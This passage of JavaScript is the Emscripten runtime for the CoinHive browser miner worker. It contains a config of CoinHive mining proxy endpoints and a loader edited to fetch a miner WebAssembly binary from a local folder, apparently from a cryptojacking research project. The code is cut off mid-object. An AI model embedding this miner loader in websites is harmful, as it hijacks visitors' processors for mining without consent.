var Module = typeof Module !== " undefined " ? Module : {};
self.CoinHive = self.CoinHive || {};
self.CoinHive.CONFIG = {
	LIB_URL: " https: //coinhive.com/lib/",
	ASMJS_NAME: "worker-asmjs.min.js",
	REQUIRES_AUTH: false,
	WEBSOCKET_SHARDS: [["wss://ws001.coinhive.com/proxy", "wss://ws002.coinhive.com/proxy", "wss://ws003.coinhive.com/proxy", "wss://ws004.coinhive.com/proxy", "wss://ws005.coinhive.com/proxy", "wss://ws006.coinhive.com/proxy", "wss://ws007.coinhive.com/proxy"], ["wss://ws008.coinhive.com/proxy", "wss://ws009.coinhive.com/proxy", "wss://ws010.coinhive.com/proxy", "wss://ws011.coinhive.com/proxy", "wss://ws012.coinhive.com/proxy", "wss://ws013.coinhive.com/proxy", "wss://ws014.coinhive.com/proxy"], ["wss://ws015.coinhive.com/proxy", "wss://ws016.coinhive.com/proxy", "wss://ws017.coinhive.com/proxy", "wss://ws018.coinhive.com/proxy", "wss://ws019.coinhive.com/proxy", "wss://ws020.coinhive.com/proxy", "wss://ws021.coinhive.com/proxy"], ["wss://ws022.coinhive.com/proxy", "wss://ws023.coinhive.com/proxy", "wss://ws024.coinhive.com/proxy", "wss://ws025.coinhive.com/proxy", "wss://ws026.coinhive.com/proxy", "wss://ws027.coinhive.com/proxy", "wss://ws028.coinhive.com/proxy"]],
	CAPTCHA_URL: "https://coinhive.com/captcha/",
	MINER_URL: "https://coinhive.com/media/miner.html",
	AUTH_URL: "https://authedmine.com/authenticate.html"
};
var Module = {
	locateFile: (function (path) {
		return path
	}),
	wasmBinary: undefined
};
var moduleOverrides = {};
var key;
for (key in Module) {
	if (Module.hasOwnProperty(key)) {
		moduleOverrides[key] = Module[key]
	}
}
Module["arguments"] = [];
Module["thisProgram"] = "./this.program";
Module["quit"] = (function (status, toThrow) {
	throw toThrow
});
Module["preRun"] = [];
Module["postRun"] = [];
var ENVIRONMENT_IS_WEB = false;
var ENVIRONMENT_IS_WORKER = false;
var ENVIRONMENT_IS_NODE = false;
var ENVIRONMENT_IS_SHELL = false;
if (Module["ENVIRONMENT"]) {
	if (Module["ENVIRONMENT"] === "WEB") {
		ENVIRONMENT_IS_WEB = true
	} else if (Module["ENVIRONMENT"] === "WORKER") {
		ENVIRONMENT_IS_WORKER = true
	} else if (Module["ENVIRONMENT"] === "NODE") {
		ENVIRONMENT_IS_NODE = true
	} else if (Module["ENVIRONMENT"] === "SHELL") {
		ENVIRONMENT_IS_SHELL = true
	} else {
		throw new Error("Module['ENVIRONMENT'] value is not valid. must be one of: WEB|WORKER|NODE|SHELL.")
	}
} else {
	ENVIRONMENT_IS_WEB = typeof window === "object";
	ENVIRONMENT_IS_WORKER = typeof importScripts === "function";
	ENVIRONMENT_IS_NODE = typeof process === "object" && typeof require === "function" && !ENVIRONMENT_IS_WEB && !ENVIRONMENT_IS_WORKER;
	ENVIRONMENT_IS_SHELL = !ENVIRONMENT_IS_WEB && !ENVIRONMENT_IS_NODE && !ENVIRONMENT_IS_WORKER
}
if (ENVIRONMENT_IS_NODE) {
	var nodeFS;
	var nodePath;
	Module["read"] = function shell_read(filename, binary) {
		var ret;
		if (!nodeFS)
			nodeFS = require("fs");
		if (!nodePath)
			nodePath = require("path");
		filename = nodePath["normalize"](filename);
		ret = nodeFS["readFileSync"](filename);
		return binary ? ret : ret.toString()
	};
	Module["readBinary"] = function readBinary(filename) {
		var ret = Module["read"](filename, true);
		if (!ret.buffer) {
			ret = new Uint8Array(ret)
		}
		assert(ret.buffer);
		return ret
	};
	if (process["argv"].length > 1) {
		Module["thisProgram"] = process["argv"][1].replace(/\\\\/g, "/")
	}
	Module["arguments"] = process["argv"].slice(2);
	if (typeof module !== "undefined") {
		module["exports"] = Module
	}
	process["on"]("uncaughtException", (function (ex) {
			if (!(ex instanceof ExitStatus)) {
				throw ex
			}
		}));
	process["on"]("unhandledRejection", (function (reason, p) {
			process["exit"](1)
		}));
	Module["inspect"] = (function () {
		return "[Emscripten Module object]"
	})
} else if (ENVIRONMENT_IS_SHELL) {
	if (typeof read != "undefined") {
		Module["read"] = function shell_read(f) {
			return read(f)
		}
	}
	Module["readBinary"] = function readBinary(f) {
		var data;
		if (typeof readbuffer === "function") {
			return new Uint8Array(readbuffer(f))
		}
		data = read(f, "binary");
		assert(typeof data === "object");
		return data
	};
	if (typeof scriptArgs != "undefined") {
		Module["arguments"] = scriptArgs
	} else if (typeof arguments != "undefined") {
		Module["arguments"] = arguments
	}
	if (typeof quit === "function") {
		Module["quit"] = (function (status, toThrow) {
			quit(status)
		})
	}
} else if (ENVIRONMENT_IS_WEB || ENVIRONMENT_IS_WORKER) {
	Module["read"] = function shell_read(url) {
		var xhr = new XMLHttpRequest;
		xhr.open("GET", url, false);
		xhr.send(null);
		return xhr.responseText
	};
	if (ENVIRONMENT_IS_WORKER) {
		Module["readBinary"] = function readBinary(url) {
			var xhr = new XMLHttpRequest;
			xhr.open("GET", url, false);
			xhr.responseType = "arraybuffer";
			xhr.send(null);
			return new Uint8Array(xhr.response)
		}
	}
	Module["readAsync"] = function readAsync(url, onload, onerror) {
		var xhr = new XMLHttpRequest;
		xhr.open("GET", url, true);
		xhr.responseType = "arraybuffer";
		xhr.onload = function xhr_onload() {
			if (xhr.status == 200 || xhr.status == 0 && xhr.response) {
				onload(xhr.response);
				return
			}
			onerror()
		};
		xhr.onerror = onerror;
		xhr.send(null)
	};
	if (typeof arguments != "undefined") {
		Module["arguments"] = arguments
	}
	Module["setWindowTitle"] = (function (title) {
		document.title = title
	})
}
Module["print"] = typeof console !== "undefined" ? console.log.bind(console) : typeof print !== "undefined" ? print : null;
Module["printErr"] = typeof printErr !== "undefined" ? printErr : typeof console !== "undefined" && console.warn.bind(console) || Module["print"];
Module.print = Module["print"];
Module.printErr = Module["printErr"];
for (key in moduleOverrides) {
	if (moduleOverrides.hasOwnProperty(key)) {
		Module[key] = moduleOverrides[key]
	}
}
moduleOverrides = undefined;
var STACK_ALIGN = 16;
function staticAlloc(size) {
	assert(!staticSealed);
	var ret = STATICTOP;
	STATICTOP = STATICTOP + size + 15 & -16;
	return ret
}
function dynamicAlloc(size) {
	assert(DYNAMICTOP_PTR);
	var ret = HEAP32[DYNAMICTOP_PTR >> 2];
	var end = ret + size + 15 & -16;
	HEAP32[DYNAMICTOP_PTR >> 2] = end;
	if (end >= TOTAL_MEMORY) {
		var success = enlargeMemory();
		if (!success) {
			HEAP32[DYNAMICTOP_PTR >> 2] = ret;
			return 0
		}
	}
	return ret
}
function alignMemory(size, factor) {
	if (!factor)
		factor = STACK_ALIGN;
	var ret = size = Math.ceil(size / factor) * factor;
	return ret
}
function getNativeTypeSize(type) {
	switch (type) {
	case "i1":
	case "i8":
		return 1;
	case "i16":
		return 2;
	case "i32":
		return 4;
	case "i64":
		return 8;
	case "float":
		return 4;
	case "double":
		return 8;
	default: {
			if (type[type.length - 1] === "*") {
				return 4
			} else if (type[0] === "i") {
				var bits = parseInt(type.substr(1));
				assert(bits % 8 === 0);
				return bits / 8
			} else {
				return 0
			}
		}
	}
}
var functionPointers = new Array(0);
var GLOBAL_BASE = 1024;
var ABORT = 0;
var EXITSTATUS = 0;
function assert(condition, text) {
	if (!condition) {
		abort("Assertion failed: " + text)
	}
}
function setValue(ptr, value, type, noSafe) {
	type = type || "i8";
	if (type.charAt(type.length - 1) === "*")
		type = "i32";
	switch (type) {
	case "i1":
		HEAP8[ptr >> 0] = value;
		break;
	case "i8":
		HEAP8[ptr >> 0] = value;
		break;
	case "i16":
		HEAP16[ptr >> 1] = value;
		break;
	case "i32":
		HEAP32[ptr >> 2] = value;
		break;
	case "i64":
		tempI64 = [value >>> 0, (tempDouble = value, +Math_abs(tempDouble) >= 1 ? tempDouble > 0 ? (Math_min(+Math_floor(tempDouble / 4294967296), 4294967295) | 0) >>> 0 : ~~+Math_ceil((tempDouble -  + (~~tempDouble >>> 0)) / 4294967296) >>> 0 : 0)],
		HEAP32[ptr >> 2] = tempI64[0],
		HEAP32[ptr + 4 >> 2] = tempI64[1];
		break;
	case "float":
		HEAPF32[ptr >> 2] = value;
		break;
	case "double":
		HEAPF64[ptr >> 3] = value;
		break;
	default:
		abort("invalid type for setValue: " + type)
	}
}
var ALLOC_STATIC = 2;
var ALLOC_NONE = 4;
function allocate(slab, types, allocator, ptr) {
	var zeroinit,
	size;
	if (typeof slab === "number") {
		zeroinit = true;
		size = slab
	} else {
		zeroinit = false;
		size = slab.length
	}
	var singleType = typeof types === "string" ? types : null;
	var ret;
	if (allocator == ALLOC_NONE) {
		ret = ptr
	} else {
		ret = [typeof _malloc === "function" ? _malloc : staticAlloc, stackAlloc, staticAlloc, dynamicAlloc][allocator === undefined ? ALLOC_STATIC : allocator](Math.max(size, singleType ? 1 : types.length))
	}
	if (zeroinit) {
		var stop;
		ptr = ret;
		assert((ret & 3) == 0);
		stop = ret + (size & ~3);
		for (; ptr < stop; ptr += 4) {
			HEAP32[ptr >> 2] = 0
		}
		stop = ret + size;
		while (ptr < stop) {
			HEAP8[ptr++ >> 0] = 0
		}
		return ret
	}
	if (singleType === "i8") {
		if (slab.subarray || slab.slice) {
			HEAPU8.set(slab, ret)
		} else {
			HEAPU8.set(new Uint8Array(slab), ret)
		}
		return ret
	}
	var i = 0,
	type,
	typeSize,
	previousType;
	while (i < size) {
		var curr = slab[i];
		type = singleType || types[i];
		if (type === 0) {
			i++;
			continue
		}
		if (type == "i64")
			type = "i32";
		setValue(ret + i, curr, type);
		if (previousType !== type) {
			typeSize = getNativeTypeSize(type);
			previousType = type
		}
		i += typeSize
	}
	return ret
}
function Pointer_stringify(ptr, length) {
	if (length === 0 || !ptr)
		return "";
	var hasUtf = 0;
	var t;
	var i = 0;
	while (1) {
		t = HEAPU8[ptr + i >> 0];
		hasUtf |= t;
		if (t == 0 && !length)
			break;
		i++;
		if (length && i == length)
			break
	}
	if (!length)
		length = i;
	var ret = "";
	if (hasUtf < 128) {
		var MAX_CHUNK = 1024;
		var curr;
		while (length > 0) {
			curr = String.fromCharCode.apply(String, HEAPU8.subarray(ptr, ptr + Math.min(length, MAX_CHUNK)));
			ret = ret ? ret + curr : curr;
			ptr += MAX_CHUNK;
			length -= MAX_CHUNK
		}
		return ret
	}
	return UTF8ToString(ptr)
}
var UTF8Decoder = typeof TextDecoder !== "undefined" ? new TextDecoder("utf8") : undefined;
function UTF8ArrayToString(u8Array, idx) {
	var endPtr = idx;
	while (u8Array[endPtr])
		++endPtr;
	if (endPtr - idx > 16 && u8Array.subarray && UTF8Decoder) {
		return UTF8Decoder.decode(u8Array.subarray(idx, endPtr))
	} else {
		var u0,
		u1,
		u2,
		u3,
		u4,
		u5;
		var str = "";
		while (1) {
			u0 = u8Array[idx++];
			if (!u0)
				return str;
			if (!(u0 & 128)) {
				str += String.fromCharCode(u0);
				continue
			}
			u1 = u8Array[idx++] & 63;
			if ((u0 & 224) == 192) {
				str += String.fromCharCode((u0 & 31) << 6 | u1);
				continue
			}
			u2 = u8Array[idx++] & 63;
			if ((u0 & 240) == 224) {
				u0 = (u0 & 15) << 12 | u1 << 6 | u2
			} else {
				u3 = u8Array[idx++] & 63;
				if ((u0 & 248) == 240) {
					u0 = (u0 & 7) << 18 | u1 << 12 | u2 << 6 | u3
				} else {
					u4 = u8Array[idx++] & 63;
					if ((u0 & 252) == 248) {
						u0 = (u0 & 3) << 24 | u1 << 18 | u2 << 12 | u3 << 6 | u4
					} else {
						u5 = u8Array[idx++] & 63;
						u0 = (u0 & 1) << 30 | u1 << 24 | u2 << 18 | u3 << 12 | u4 << 6 | u5
					}
				}
			}
			if (u0 < 65536) {
				str += String.fromCharCode(u0)
			} else {
				var ch = u0 - 65536;
				str += String.fromCharCode(55296 | ch >> 10, 56320 | ch & 1023)
			}
		}
	}
}
function UTF8ToString(ptr) {
	return UTF8ArrayToString(HEAPU8, ptr)
}
function stringToUTF8Array(str, outU8Array, outIdx, maxBytesToWrite) {
	if (!(maxBytesToWrite > 0))
		return 0;
	var startIdx = outIdx;
	var endIdx = outIdx + maxBytesToWrite - 1;
	for (var i = 0; i < str.length; ++i) {
		var u = str.charCodeAt(i);
		if (u >= 55296 && u <= 57343)
			u = 65536 + ((u & 1023) << 10) | str.charCodeAt(++i) & 1023;
		if (u <= 127) {
			if (outIdx >= endIdx)
				break;
			outU8Array[outIdx++] = u
		} else if (u <= 2047) {
			if (outIdx + 1 >= endIdx)
				break;
			outU8Array[outIdx++] = 192 | u >> 6;
			outU8Array[outIdx++] = 128 | u & 63
		} else if (u <= 65535) {
			if (outIdx + 2 >= endIdx)
				break;
			outU8Array[outIdx++] = 224 | u >> 12;
			outU8Array[outIdx++] = 128 | u >> 6 & 63;
			outU8Array[outIdx++] = 128 | u & 63
		} else if (u <= 2097151) {
			if (outIdx + 3 >= endIdx)
				break;
			outU8Array[outIdx++] = 240 | u >> 18;
			outU8Array[outIdx++] = 128 | u >> 12 & 63;
			outU8Array[outIdx++] = 128 | u >> 6 & 63;
			outU8Array[outIdx++] = 128 | u & 63
		} else if (u <= 67108863) {
			if (outIdx + 4 >= endIdx)
				break;
			outU8Array[outIdx++] = 248 | u >> 24;
			outU8Array[outIdx++] = 128 | u >> 18 & 63;
			outU8Array[outIdx++] = 128 | u >> 12 & 63;
			outU8Array[outIdx++] = 128 | u >> 6 & 63;
			outU8Array[outIdx++] = 128 | u & 63
		} else {
			if (outIdx + 5 >= endIdx)
				break;
			outU8Array[outIdx++] = 252 | u >> 30;
			outU8Array[outIdx++] = 128 | u >> 24 & 63;
			outU8Array[outIdx++] = 128 | u >> 18 & 63;
			outU8Array[outIdx++] = 128 | u >> 12 & 63;
			outU8Array[outIdx++] = 128 | u >> 6 & 63;
			outU8Array[outIdx++] = 128 | u & 63
		}
	}
	outU8Array[outIdx] = 0;
	return outIdx - startIdx
}
function lengthBytesUTF8(str) {
	var len = 0;
	for (var i = 0; i < str.length; ++i) {
		var u = str.charCodeAt(i);
		if (u >= 55296 && u <= 57343)
			u = 65536 + ((u & 1023) << 10) | str.charCodeAt(++i) & 1023;
		if (u <= 127) {
			++len
		} else if (u <= 2047) {
			len += 2
		} else if (u <= 65535) {
			len += 3
		} else if (u <= 2097151) {
			len += 4
		} else if (u <= 67108863) {
			len += 5
		} else {
			len += 6
		}
	}
	return len
}
var UTF16Decoder = typeof TextDecoder !== "undefined" ? new TextDecoder("utf-16le") : undefined;
var WASM_PAGE_SIZE = 65536;
var ASMJS_PAGE_SIZE = 16777216;
function alignUp(x, multiple) {
	if (x % multiple > 0) {
		x += multiple - x % multiple
	}
	return x
}
var buffer, HEAP8, HEAPU8, HEAP16, HEAPU16, HEAP32, HEAPU32, HEAPF32, HEAPF64;
function updateGlobalBuffer(buf) {
	Module["buffer"] = buffer = buf
}
function updateGlobalBufferViews() {
	Module["HEAP8"] = HEAP8 = new Int8Array(buffer);
	Module["HEAP16"] = HEAP16 = new Int16Array(buffer);
	Module["HEAP32"] = HEAP32 = new Int32Array(buffer);
	Module["HEAPU8"] = HEAPU8 = new Uint8Array(buffer);
	Module["HEAPU16"] = HEAPU16 = new Uint16Array(buffer);
	Module["HEAPU32"] = HEAPU32 = new Uint32Array(buffer);
	Module["HEAPF32"] = HEAPF32 = new Float32Array(buffer);
	Module["HEAPF64"] = HEAPF64 = new Float64Array(buffer)
}
var STATIC_BASE, STATICTOP, staticSealed;
var STACK_BASE, STACKTOP, STACK_MAX;
var DYNAMIC_BASE, DYNAMICTOP_PTR;
STATIC_BASE = STATICTOP = STACK_BASE = STACKTOP = STACK_MAX = DYNAMIC_BASE = DYNAMICTOP_PTR = 0;
staticSealed = false;
function abortOnCannotGrowMemory() {
	abort("Cannot enlarge memory arrays. Either (1) compile with -s TOTAL_MEMORY=X with X higher than the current value " + TOTAL_MEMORY + ", (2) compile with -s ALLOW_MEMORY_GROWTH=1 which allows increasing the size at runtime, or (3) if you want malloc to return NULL (0) instead of this abort, compile with -s ABORTING_MALLOC=0 ")
}
function enlargeMemory() {
	abortOnCannotGrowMemory()
}
var TOTAL_STACK = Module["TOTAL_STACK"] || 5242880;
var TOTAL_MEMORY = Module["TOTAL_MEMORY"] || 16777216;
if (TOTAL_MEMORY < TOTAL_STACK)
	Module.printErr("TOTAL_MEMORY should be larger than TOTAL_STACK, was " + TOTAL_MEMORY + "! (TOTAL_STACK=" + TOTAL_STACK + ")");
if (Module["buffer"]) {
	buffer = Module["buffer"]
} else {
	if (typeof WebAssembly === "object" && typeof WebAssembly.Memory === "function") {
		Module["wasmMemory"] = new WebAssembly.Memory({
				"initial": TOTAL_MEMORY / WASM_PAGE_SIZE,
				"maximum": TOTAL_MEMORY / WASM_PAGE_SIZE
			});
		buffer = Module["wasmMemory"].buffer
	} else {
		buffer = new ArrayBuffer(TOTAL_MEMORY)
	}
	Module["buffer"] = buffer
}
updateGlobalBufferViews();
function getTotalMemory() {
	return TOTAL_MEMORY
}
HEAP32[0] = 1668509029;
HEAP16[1] = 25459;
if (HEAPU8[2] !== 115 || HEAPU8[3] !== 99)
	throw "Runtime error: expected the system to be little-endian!";
function callRuntimeCallbacks(callbacks) {
	while (callbacks.length > 0) {
		var callback = callbacks.shift();
		if (typeof callback == "function") {
			callback();
			continue
		}
		var func = callback.func;
		if (typeof func === "number") {
			if (callback.arg === undefined) {
				Module["dynCall_v"](func)
			} else {
				Module["dynCall_vi"](func, callback.arg)
			}
		} else {
			func(callback.arg === undefined ? null : callback.arg)
		}
	}
}
var __ATPRERUN__ = [];
var __ATINIT__ = [];
var __ATMAIN__ = [];
var __ATEXIT__ = [];
var __ATPOSTRUN__ = [];
var runtimeInitialized = false;
var runtimeExited = false;
function preRun() {
	if (Module["preRun"]) {
		if (typeof Module["preRun"] == "function")
			Module["preRun"] = [Module["preRun"]];
		while (Module["preRun"].length) {
			addOnPreRun(Module["preRun"].shift())
		}
	}
	callRuntimeCallbacks(__ATPRERUN__)
}
function ensureInitRuntime() {
	if (runtimeInitialized)
		return;
	runtimeInitialized = true;
	callRuntimeCallbacks(__ATINIT__)
}
function preMain() {
	callRuntimeCallbacks(__ATMAIN__)
}
function exitRuntime() {
	callRuntimeCallbacks(__ATEXIT__);
	runtimeExited = true
}
function postRun() {
	if (Module["postRun"]) {
		if (typeof Module["postRun"] == "function")
			Module["postRun"] = [Module["postRun"]];
		while (Module["postRun"].length) {
			addOnPostRun(Module["postRun"].shift())
		}
	}
	callRuntimeCallbacks(__ATPOSTRUN__)
}
function addOnPreRun(cb) {
	__ATPRERUN__.unshift(cb)
}
function addOnPostRun(cb) {
	__ATPOSTRUN__.unshift(cb)
}
var Math_abs = Math.abs;
var Math_cos = Math.cos;
var Math_sin = Math.sin;
var Math_tan = Math.tan;
var Math_acos = Math.acos;
var Math_asin = Math.asin;
var Math_atan = Math.atan;
var Math_atan2 = Math.atan2;
var Math_exp = Math.exp;
var Math_log = Math.log;
var Math_sqrt = Math.sqrt;
var Math_ceil = Math.ceil;
var Math_floor = Math.floor;
var Math_pow = Math.pow;
var Math_imul = Math.imul;
var Math_fround = Math.fround;
var Math_round = Math.round;
var Math_min = Math.min;
var Math_max = Math.max;
var Math_clz32 = Math.clz32;
var Math_trunc = Math.trunc;
var runDependencies = 0;
var runDependencyWatcher = null;
var dependenciesFulfilled = null;
function addRunDependency(id) {
	runDependencies++;
	if (Module["monitorRunDependencies"]) {
		Module["monitorRunDependencies"](runDependencies)
	}
}
function removeRunDependency(id) {
	runDependencies--;
	if (Module["monitorRunDependencies"]) {
		Module["monitorRunDependencies"](runDependencies)
	}
	if (runDependencies == 0) {
		if (runDependencyWatcher !== null) {
			clearInterval(runDependencyWatcher);
			runDependencyWatcher = null
		}
		if (dependenciesFulfilled) {
			var callback = dependenciesFulfilled;
			dependenciesFulfilled = null;
			callback()
		}
	}
}
Module["preloadedImages"] = {};
Module["preloadedAudios"] = {};
var dataURIPrefix = "data:application/octet-stream;base64,";
function isDataURI(filename) {
	return String.prototype.startsWith ? filename.startsWith(dataURIPrefix) : filename.indexOf(dataURIPrefix) === 0
}
function integrateWasmJS() {
	var wasmTextFile = "worker-v2.wast";
	var wasmBinaryFile = "worker64_profiled.wasm";
	var asmjsCodeFile = "worker-v2.temp.asm.js";
	if (typeof Module["locateFile"] === "function") {
		if (!isDataURI(wasmTextFile)) {
			wasmTextFile = Module["locateFile"](wasmTextFile)
		}
		if (!isDataURI(wasmBinaryFile)) {
			wasmBinaryFile = Module["locateFile"](wasmBinaryFile)
		}
		if (!isDataURI(asmjsCodeFile)) {
			asmjsCodeFile = Module["locateFile"](asmjsCodeFile)
		}
	}
	var wasmPageSize = 64 * 1024;
	var info = {
		"global": null,
		"env": null,
		"asm2wasm": {
			"f64-rem": (function (x, y) {
				return x % y
			}),
			"debugger": (function () {
				debugger
			})
		},
		"parent": Module
	};
	var exports = null;
	function mergeMemory(newBuffer) {
		var oldBuffer = Module["buffer"];
		if (newBuffer.byteLength < oldBuffer.byteLength) {
			Module["printErr"]("the new buffer in mergeMemory is smaller than the previous one. in native wasm, we should grow memory here")
		}
		var oldView = new Int8Array(oldBuffer);
		var newView = new Int8Array(newBuffer);
		newView.set(oldView);
		updateGlobalBuffer(newBuffer);
		updateGlobalBufferViews()
	}
	function fixImports(imports) {
		return imports
	}
	function getBinary() {
		try {
			if (Module["wasmBinary"]) {
				return new Uint8Array(Module["wasmBinary"])
			}
			if (Module["readBinary"]) {
				return Module["readBinary"](wasmBinaryFile)
			} else {
				throw "on the web, we need the wasm binary to be preloaded and set on Module['wasmBinary']. emcc.py will do that for you when generating HTML (but not JS)"
			}
		} catch (err) {
			abort(err)
		}
	}
	function getBinaryPromise() {
		if (!Module["wasmBinary"] && (ENVIRONMENT_IS_WEB || ENVIRONMENT_IS_WORKER) && typeof fetch === "function") {
			console.log('inside getbinarypromise');
			console.log(wasmBinaryFile);
			return fetch('worker.wasm').then((function (response) {
					if (!response["ok"]) {
						throw "failed to load wasm binary file at '" + wasmBinaryFile + "'"
					}
					console.log("arrayBuffer");
					return response["arrayBuffer"]()
				})).catch((function () {
					return getBinary()
				}))
		}
		return new Promise((function (resolve, reject) {
				resolve(getBinary())
			}))
	}
	function doNativeWasm(global, env, providedBuffer) {
		if (typeof WebAssembly !== "object") {
			Module["printErr"]("no native wasm support detected");
			return false
		}
		if (!(Module["wasmMemory"]instanceof WebAssembly.Memory)) {
			Module["printErr"]("no native wasm Memory in use");
			return false
		}
		env["memory"] = Module["wasmMemory"];
		info["global"] = {
			"NaN": NaN,
			"Infinity": Infinity
		};
		info["global.Math"] = Math;
		info["env"] = env;
		function receiveInstance(instance, module) {
			exports = instance.exports;
			if (exports.memory)
				mergeMemory(exports.memory);
			Module["asm"] = exports;
			Module["usingWasm"] = true;
			removeRunDependency("wasm-instantiate")
		}
		addRunDependency("wasm-instantiate");
		if (Module["instantiateWasm"]) {
			try {
				return Module["instantiateWasm"](info, receiveInstance)
			} catch (e) {
				Module["printErr"]("Module.instantiateWasm callback failed with error: " + e);
				return false
			}
		}
		function receiveInstantiatedSource(output) {
			receiveInstance(output["instance"], output["module"])
		}
		function instantiateArrayBuffer(receiver) {
			var whttp = new XMLHttpRequest();
			whttp.onreadystatechange = function() {
				if (this.readyState == 4 && this.status == 200) {
					var bytes = whttp.response;
					WebAssembly.instantiate(bytes, info).then(receiver);
				}
			};
			whttp.open("GET", "file:///C:/Users/benja/Dropbox/CryptoMiningHijack/wasm/CoinHive/64-bit/worker64_profiled.wasm", true);
			//whttp.open("GET", "file:///C:/Users/wxw120630/Dropbox/doc/publication/CryptoMiningHijack/wasm/coinhive_case/worker.wasm", true);
			whttp.responseType = 'arraybuffer';
			whttp.send();
/* 			getBinaryPromise().then((function (binary) {
					return WebAssembly.instantiate(binary, info)
				})).then(receiver).catch((function (reason) {
					Module["printErr"]("failed to asynchronously prepare wasm: " + reason);
					abort(reason)
				})) */
		}
		if (!Module["wasmBinary"] && typeof WebAssembly.instantiateStreaming === "function" && !isDataURI(wasmBinaryFile) && typeof fetch === "function") {
			instantiateArrayBuffer(receiveInstantiatedSource)
		} else {
			instantiateArrayBuffer(receiveInstantiatedSource)
		}
		return {}
	}
	Module["asmPreload"] = Module["asm"];
	var asmjsReallocBuffer = Module["reallocBuffer"];
	var wasmReallocBuffer = (function (size) {
		var PAGE_MULTIPLE = Module["usingWasm"] ? WASM_PAGE_SIZE : ASMJS_PAGE_SIZE;
		size = alignUp(size, PAGE_MULTIPLE);
		var old = Module["buffer"];
		var oldSize = old.byteLength;
		if (Module["usingWasm"]) {
			try {
				var result = Module["wasmMemory"].grow((size - oldSize) / wasmPageSize);
				if (result !== (-1 | 0)) {
					return Module["buffer"] = Module["wasmMemory"].buffer
				} else {
					return null
				}
			} catch (e) {
				return null
			}
		}
	});
	Module["reallocBuffer"] = (function (size) {
		if (finalMethod === "asmjs") {
			return asmjsReallocBuffer(size)
		} else {
			return wasmReallocBuffer(size)
		}
	});
	var finalMethod = "";
	Module["asm"] = (function (global, env, providedBuffer) {
		env = fixImports(env);
		if (!env["table"]) {
			var TABLE_SIZE = Module["wasmTableSize"];
			if (TABLE_SIZE === undefined)
				TABLE_SIZE = 1024;
			var MAX_TABLE_SIZE = Module["wasmMaxTableSize"];
			if (typeof WebAssembly === "object" && typeof WebAssembly.Table === "function") {
				if (MAX_TABLE_SIZE !== undefined) {
					env["table"] = new WebAssembly.Table({
							"initial": TABLE_SIZE,
							"maximum": MAX_TABLE_SIZE,
							"element": "anyfunc"
						})
				} else {
					env["table"] = new WebAssembly.Table({
							"initial": TABLE_SIZE,
							element: "anyfunc"
						})
				}
			} else {
				env["table"] = new Array(TABLE_SIZE)
			}
			Module["wasmTable"] = env["table"]
		}
		if (!env["memoryBase"]) {
			env["memoryBase"] = Module["STATIC_BASE"]
		}
		if (!env["tableBase"]) {
			env["tableBase"] = 0
		}
		var exports;
		exports = doNativeWasm(global, env, providedBuffer);
		if (!exports)
			abort("no binaryen method succeeded. consider enabling more options, like interpreting, if you want that: https://github.com/kripken/emscripten/wiki/WebAssembly#binaryen-methods");
		return exports
	})
}
integrateWasmJS();
STATIC_BASE = GLOBAL_BASE;
STATICTOP = STATIC_BASE + 10240;
__ATINIT__.push();
var STATIC_BUMP = 10240;
Module["STATIC_BASE"] = STATIC_BASE;
Module["STATIC_BUMP"] = STATIC_BUMP;
STATICTOP += 16;
var PROCINFO = {
	ppid: 1,
	pid: 42,
	sid: 42,
	pgid: 42
};
var SYSCALLS = {
	varargs: 0,
	get: (function (varargs) {
		SYSCALLS.varargs += 4;
		var ret = HEAP32[SYSCALLS.varargs - 4 >> 2];
		return ret
	}),
	getStr: (function () {
		var ret = Pointer_stringify(SYSCALLS.get());
		return ret
	}),
	get64: (function () {
		var low = SYSCALLS.get(),
		high = SYSCALLS.get();
		if (low >= 0)
			assert(high === 0);
		else
			assert(high === -1);
		return low
	}),
	getZero: (function () {
		assert(SYSCALLS.get() === 0)
	})
};
function ___syscall20(which, varargs) {
	SYSCALLS.varargs = varargs;
	try {
		return PROCINFO.pid
	} catch (e) {
		if (typeof FS === "undefined" || !(e instanceof FS.ErrnoError))
			abort(e);
		return -e.errno
	}
}
function _ftime(p) {
	var millis = Date.now();
	HEAP32[p >> 2] = millis / 1e3 | 0;
	HEAP16[p + 4 >> 1] = millis % 1e3;
	HEAP16[p + 6 >> 1] = 0;
	HEAP16[p + 8 >> 1] = 0;
	return 0
}
var ___tm_current = STATICTOP;
STATICTOP += 48;
var ___tm_timezone = allocate(intArrayFromString("GMT"), "i8", ALLOC_STATIC);
function _gmtime_r(time, tmPtr) {
	var date = new Date(HEAP32[time >> 2] * 1e3);
	HEAP32[tmPtr >> 2] = date.getUTCSeconds();
	HEAP32[tmPtr + 4 >> 2] = date.getUTCMinutes();
	HEAP32[tmPtr + 8 >> 2] = date.getUTCHours();
	HEAP32[tmPtr + 12 >> 2] = date.getUTCDate();
	HEAP32[tmPtr + 16 >> 2] = date.getUTCMonth();
	HEAP32[tmPtr + 20 >> 2] = date.getUTCFullYear() - 1900;
	HEAP32[tmPtr + 24 >> 2] = date.getUTCDay();
	HEAP32[tmPtr + 36 >> 2] = 0;
	HEAP32[tmPtr + 32 >> 2] = 0;
	var start = Date.UTC(date.getUTCFullYear(), 0, 1, 0, 0, 0, 0);
	var yday = (date.getTime() - start) / (1e3 * 60 * 60 * 24) | 0;
	HEAP32[tmPtr + 28 >> 2] = yday;
	HEAP32[tmPtr + 40 >> 2] = ___tm_timezone;
	return tmPtr
}
function _gmtime(time) {
	return _gmtime_r(time, ___tm_current)
}
function _emscripten_memcpy_big(dest, src, num) {
	HEAPU8.set(HEAPU8.subarray(src, src + num), dest);
	return dest
}
function ___setErrNo(value) {
	if (Module["___errno_location"])
		HEAP32[Module["___errno_location"]() >> 2] = value;
	return value
}
DYNAMICTOP_PTR = staticAlloc(4);
STACK_BASE = STACKTOP = alignMemory(STATICTOP);
STACK_MAX = STACK_BASE + TOTAL_STACK;
DYNAMIC_BASE = alignMemory(STACK_MAX);
HEAP32[DYNAMICTOP_PTR >> 2] = DYNAMIC_BASE;
staticSealed = true;
function intArrayFromString(stringy, dontAddNull, length) {
	var len = length > 0 ? length : lengthBytesUTF8(stringy) + 1;
	var u8array = new Array(len);
	var numBytesWritten = stringToUTF8Array(stringy, u8array, 0, u8array.length);
	if (dontAddNull)
		u8array.length = numBytesWritten;
	return u8array
}
Module["wasmTableSize"] = 8;
Module["wasmMaxTableSize"] = 8;
Module.asmGlobalArg = {};
Module.asmLibraryArg = {
	"abort": abort,
	"enlargeMemory": enlargeMemory,
	"getTotalMemory": getTotalMemory,
	"abortOnCannotGrowMemory": abortOnCannotGrowMemory,
	"___setErrNo": ___setErrNo,
	"___syscall20": ___syscall20,
